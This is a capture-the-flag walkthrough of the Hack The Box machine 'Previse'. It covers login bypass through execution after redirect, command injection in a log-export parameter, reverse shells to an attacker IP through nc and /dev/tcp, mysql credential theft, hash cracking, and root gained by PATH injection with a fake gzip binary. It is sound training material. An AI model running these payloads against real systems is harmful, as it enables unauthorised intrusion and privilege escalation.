# Previse - Easy

```shell
nmap -T4 -p- -A -Pn -v previse.htb

gobuster dir -u http://previse.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html,bak -t 50

ffuf -c -u "http://previse.htb" -H "Host: FUZZ.previse.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 50 -s
#subdomain enumeration

ffuf -c -u "http://previse.htb" -H "Host: FUZZ.previse.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 50 -s -fw 737
#filtering false positives

#login by exploiting EAR vulnerability
#command execution in logs page

#setup listener
nc -nvlp 4444
#command injection in Logs page
#we get reverse shell

python3 -c 'import pty;pty.spawn("/bin/bash")'

ls -la

cat config.php
#contains mysql creds

mysql -u root -p
#enter password found above

show databases;

use previse;

show tables;

select * from accounts;
#we get hash for m4lwhere

#in attacker machine
vim hash.txt
#paste hash

hashcat -a 0 hash.txt /usr/share/wordlists/rockyou.txt
#md5crypt hash
#cracks the hash

ssh m4lwhere@previse.htb
#using the cracked password, we can login

#get user flag

sudo -l
#we can execute a script as root

cat /opt/scripts/access_backup.sh

#path injection

echo "sh -i >& /dev/tcp/10.10.14.2/4445 0>&1" > gzip

chmod +x gzip

export PATH=/home/m4lwhere/:$PATH

echo $PATH

#setup listener in attacker machine
nc -nvlp 4445

sudo /opt/scripts/access_backup.sh
#this gives us root shell on our listener
```

* Open ports & services:

  * 22 - ssh - OpenSSH 7.6p1 (Ubuntu)
  * 80 - http - Apache httpd 2.4.29

* The webpage on port 80 is a login page for 'Previse File Storage'.

* Using ```gobuster```, we can enumerate the directories - most of them cannot be accessed as we are not logged in.

* We can access /nav.php, which includes a sitemap for the website.

* We can also access /header.php, /footer.php and /config.php, but these pages do not show anything.

* Meanwhile, we can also attempt to check for subdomains using ```ffuf``` - we can ignore false positives using the ```-fw``` flag.

* Now, if we intercept the request to another directory, such as /files.php, and send the request to Repeater, we can view the response.

* This response (before redirect) uses 302 status code, but it also contains the webpage source code.

* So, for all the enumerated pages, we can view the source code as response using Burp Suite Repeater.

* This is an example of ```EAR (Execution After Redirect) vulnerability```.

* We can try to view the /index.php page and exploit this vulnerability.

* We can intercept a request to /index.php, and in Burp Suite, we can enable 'Do Intercept > Response to this Request'.

* In the response, we can modify '302 Found' in the header to '200 OK' as if it is a normal page.

* Using this, we are able to bypass login and view /index.php

* This includes a page for 'Create Account' - we can use the same technique of modifying the response to the request, and add another user.

* After adding a new user, we can login as that user and get access to /index.php as usual.

* We can download 'SITEBACKUP.ZIP' from the Files page; this gives us source code in the form of PHP files.

* We can enumerate the webpage and go through the files simultaneously in order to check source code.

* In the 'Request Log Data' page, we have the ability to set delimiters in our logs.

* The ```logs.php``` file contains its source code, and it shows that it uses Python for this - we can attempt for command execution.

* By intercepting the request to this page, and sending it to Repeater, we can modify the 'delim' parameter by adding a semicolon and executing 'sleep' command:

```delim=comma; sleep 3```

* This gives response after 3 seconds, so we can attempt to get reverse shell:

```delim=comma; rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|sh+-i+2>%261|nc+10.10.14.2+4444+>/tmp/f```

* We get reverse-shell on our listener, after executing URL-encoded command.

* From the ```config.php``` file in web directory, we get ```mysql``` creds "root:mySQL_p@ssw0rd!:)"

* Logging into ```mysql```, we can see the 'previse' database - this contains two tables 'accounts' and 'files'.

* The 'accounts' table contains hashes for 'm4lwhere' and the user we created earlier.

* We can attempt to crack the hash for 'm4lwhere' user using ```hashcat```.

* As the hash includes an emoji, we are unable to detect the hash type using online services.

* However ```hashcat``` is able to auto-detect the hash to be of type 'md5crypt', and we are able to crack the hash and get the password.

* Using this password, we are able to login as 'm4lwhere' via SSH.

* Checking ```sudo -l```, we can run a script as root; furthermore, it does not show the usual header in ```sudo -l```, which contains entries such as ```env_reset``` and ```secure_path```.

* This means we can attempt ```path injection``` in this case as the script calls 'gzip' using relative path.

* So, we can create a malicious binary 'gzip' in our home directory, add that path to PATH variable, and execute the script as root.

* We get a root shell on our listener as a result.

```markdown
1. User flag - c71c9afd035c06d4b3e8ce3d706fd0c7

2. Root flag - 0f320763fda0451d24ca0e66e0758329
```
